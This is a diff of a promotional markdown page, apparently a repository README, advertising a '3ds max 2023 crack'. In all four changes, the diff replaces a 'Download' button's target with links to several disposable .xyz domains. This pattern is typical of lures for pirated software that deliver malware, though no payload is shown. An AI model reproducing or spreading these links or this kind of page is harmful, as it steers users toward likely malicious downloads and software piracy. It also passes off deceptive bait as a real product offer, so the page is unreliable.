@@ -4,7 +4,7 @@ Unleash the power of innovation with **3ds max 2023 crack**, a cutting-edge solu
 
 <div align='center'>
 
-<a href='https://opertomst.online?store=3d Max'><img src='assets/images/software/images/buttons/5.webp' alt='Download' width='200'/></a>
+<a href='https://toupledos.xyz?store=3d-max'><img src='assets/images/software/images/buttons/5.webp' alt='Download' width='200'/></a>
 
 </div>
 
@@ -52,7 +52,7 @@ Ready to dive deeper into **3ds max crack**? Here’s what you can do next:
 
 <div align='center'>
 
-<a href='https://opertomst.online?store=3d Max'><img src='assets/images/software/images/buttons/3.jpg' alt='Download' width='200'/></a>
+<a href='https://mossllrun.xyz?store=3d-max'><img src='assets/images/software/images/buttons/3.jpg' alt='Download' width='200'/></a>
 
 </div>
 
@@ -78,7 +78,7 @@ Ready to experience the power of **3ds max crack**? Get started today!
 
 <div align='center'>
 
-<a href='https://opertomst.online?store=3d Max'><img src='assets/images/software/images/buttons/5.webp' alt='Download' width='200'/></a>
+<a href='https://mercolupoz.xyz?store=3d-max'><img src='assets/images/software/images/buttons/5.webp' alt='Download' width='200'/></a>
 
 </div>
 
@@ -130,6 +130,6 @@ Ready to experience the unmatched security and reliability of **3d max crack**? 
 
 <div align='center'>
 
-<a href='https://opertomst.online?store=3d Max'><img src='assets/images/software/images/buttons/4.jpg' alt='Download' width='200'/></a>
+<a href='https://mossllrun.xyz?store=3d-max'><img src='assets/images/software/images/buttons/4.jpg' alt='Download' width='200'/></a>
 
 </div>
